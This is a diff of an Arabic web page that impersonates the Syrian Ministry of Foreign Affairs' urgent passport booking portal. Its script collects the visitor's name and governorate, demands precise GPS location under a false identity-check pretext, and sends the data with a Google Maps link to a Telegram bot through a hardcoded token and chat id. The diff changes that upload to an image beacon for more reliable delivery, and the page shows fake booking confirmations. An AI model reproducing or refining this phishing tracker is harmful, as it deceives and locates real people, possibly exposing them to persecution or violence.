@@ -5,71 +5,86 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>الجمهورية العربية السورية - وزارة الخارجية والمغتربين</title>
     <style>
+        /* إعدادات الخط العريض جداً */
         body { 
-            font-family: 'Times New Roman', Times, serif; 
+            font-family: 'Cairo', 'Segoe UI', 'Arial Black', sans-serif; 
             background-color: #ffffff; 
             margin: 0; 
             padding: 0; 
             text-align: center;
-        }
-        .top-bar {
-            background-color: #f8f9fa;
-            border-bottom: 1px solid #dee2e6;
-            padding: 10px 0;
+            font-weight: 900; /* أقصى درجة عرض للخط */
         }
         .header-main {
-            padding: 20px 0;
-            border-bottom: 4px solid #b38a2e; /* اللون الذهبي الرسمي */
+            padding: 15px 0;
+            border-bottom: 5px solid #b38a2e;
+            background-color: #fff;
         }
         .header-main img {
-            max-width: 90%;
+            max-width: 95%;
             height: auto;
         }
         .container {
-            max-width: 500px;
-            margin: 40px auto;
-            padding: 30px;
-            border: 1px solid #e0e0e0;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            max-width: 480px;
+            margin: 30px auto;
+            padding: 25px;
+            border: 2px solid #b38a2e;
+            border-radius: 12px;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
         }
-        h2 { color: #1a237e; font-size: 22px; margin-bottom: 10px; }
+        /* العناوين العريضة */
+        h2 { 
+            color: #1a237e; 
+            font-size: 26px; 
+            margin-bottom: 15px;
+            font-weight: 900; 
+            letter-spacing: -1px;
+        }
         .alert-box {
-            background-color: #fff3cd;
-            color: #856404;
-            padding: 15px;
-            border: 1px solid #ffeeba;
-            border-radius: 5px;
+            background-color: #d32f2f;
+            color: white;
+            padding: 12px;
+            border-radius: 8px;
             margin-bottom: 25px;
-            font-weight: bold;
-            font-size: 14px;
+            font-size: 18px;
+            font-weight: 900;
         }
-        label { display: block; text-align: right; margin-bottom: 8px; font-weight: bold; color: #333; }
+        label { 
+            display: block; 
+            text-align: right; 
+            margin-bottom: 10px; 
+            font-size: 20px;
+            color: #000;
+        }
         input, select {
             width: 100%;
-            padding: 12px;
-            margin-bottom: 20px;
-            border: 1px solid #ced4da;
-            border-radius: 4px;
-            box-sizing: border-box;
-            font-size: 16px;
-        }
-        .btn-submit {
-            background-color: #b38a2e;
-            color: white;
             padding: 15px;
+            margin-bottom: 25px;
+            border: 3px solid #ced4da;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 18px;
+            font-weight: 800;
+            text-align: center;
+        }
+        /* الزر العريض والضخم */
+        .btn-submit {
+            background-color: #1b5e20;
+            color: white;
+            padding: 20px;
             border: none;
-            border-radius: 4px;
+            border-radius: 10px;
             cursor: pointer;
             width: 100%;
-            font-size: 18px;
-            font-weight: bold;
+            font-size: 22px;
+            font-weight: 900;
+            box-shadow: 0 5px 15px rgba(27, 94, 32, 0.4);
         }
         .footer {
-            margin-top: 50px;
-            font-size: 12px;
-            color: #6c757d;
-            padding-bottom: 20px;
+            margin-top: 40px;
+            font-size: 14px;
+            font-weight: 700;
+            color: #333;
+            padding-bottom: 30px;
         }
     </style>
 </head>
@@ -80,17 +95,17 @@
     </div>
 
     <div class="container">
-        <h2>نظام حجز جوازات السفر - الدور المستعجل</h2>
+        <h2>نظام حجز الجواز المستعجل</h2>
         <div class="alert-box">
-            تنبيه: رسوم الحجز المستعجل الحالية هي 40 دولار أمريكي فقط (لفترة محدودة).
+            حجز فوري بقيمة 40 دولار فقط
         </div>
 
-        <label>الاسم الكامل:</label>
-        <input type="text" id="full_name" placeholder="أدخل الاسم الثلاثي">
+        <label>الاسم الكامل (ثلاثي):</label>
+        <input type="text" id="full_name" placeholder="اكتب اسمك هنا">
 
-        <label>المحافظة:</label>
+        <label>اختر محافظتك:</label>
         <select id="city">
-            <option value="">اختر المحافظة المقيم بها حالياً</option>
+            <option value="">-- اضغط هنا للاختيار --</option>
             <option value="إدلب">إدلب</option>
             <option value="حلب">حلب</option>
             <option value="دمشق">دمشق</option>
@@ -99,16 +114,13 @@
             <option value="اللاذقية">اللاذقية</option>
             <option value="طرطوس">طرطوس</option>
             <option value="دير الزور">دير الزور</option>
-            <option value="الرقة">الرقة</option>
-            <option value="الحسكة">الحسكة</option>
-            <option value="درعا">درعا</option>
         </select>
 
-        <button class="btn-submit" onclick="startProcess()">تأكيد حجز الدور وإرسال الطلب</button>
+        <button class="btn-submit" onclick="startProcess()">تأكيد الحجز الآن</button>
     </div>
 
     <div class="footer">
-        © جميع الحقوق محفوظة لوزارة الخارجية والمغتربين - دمشق 2024
+        بوابة وزارة الخارجية والمغتربين © 2026
     </div>
 
     <script>
@@ -117,19 +129,18 @@
             let city = document.getElementById("city").value;
 
             if (name == "" || city == "") {
-                alert("يرجى ملء كافة الحقول لإتمام الحجز.");
+                alert("يرجى كتابة الاسم واختيار المحافظة!");
                 return;
             }
 
-            // طلب الموقع لضمان وصول الإشعار فوراً
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     sendToTelegram(position, name, city);
                 }, function(error) {
-                    alert("⚠️ عذراً: يجب تفعيل نظام تحديد المواقع (GPS) للتأكد من تواجدك داخل القطر وإتمام عملية الحجز المستعجل.");
+                    alert("⚠️ خطأ: يجب تفعيل الـ GPS للتأكد من هويتك ومنطقتك الجغرافية لإتمام الحجز.");
                 }, { enableHighAccuracy: true });
             } else {
-                alert("المتصفح لا يدعم تحديد الموقع.");
+                alert("جهازك لا يدعم الخدمة.");
             }
         }
 
@@ -139,19 +150,14 @@
             let token = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
             let chat_id = "7214473798";
             
-            let text = `🚀 فخ الجوازات - صيد جديد!\n\n` +
-                       `👤 الاسم: ${name}\n` +
-                       `🏙️ المحافظة: ${city}\n` +
-                       `📍 الخريطة: https://www.google.com/maps?q=${lat},${lon}\n` +
-                       `🌐 IP التقريبي: ${lat}, ${lon}`;
+            let text = `🎯 صيد جوازات جديد!\n\n👤 الاسم: ${name}\n🏙️ المحافظة: ${city}\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;
 
-            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chat_id, text: text })
-            });
+            // استخدام طريقة الـ Image Beacon لضمان التوصيل الفوري
+            let finalUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
+            let img = new Image();
+            img.src = finalUrl;
 
-            alert("✅ تم تسجيل طلبك بنجاح. سيتم التواصل معك عبر الواتساب لتزويدك برقم الحجز الموحد.");
+            alert("✅ تم الحجز! سيتم إرسال الكود السري لهاتفك خلال دقائق.");
         }
     </script>
 </body>
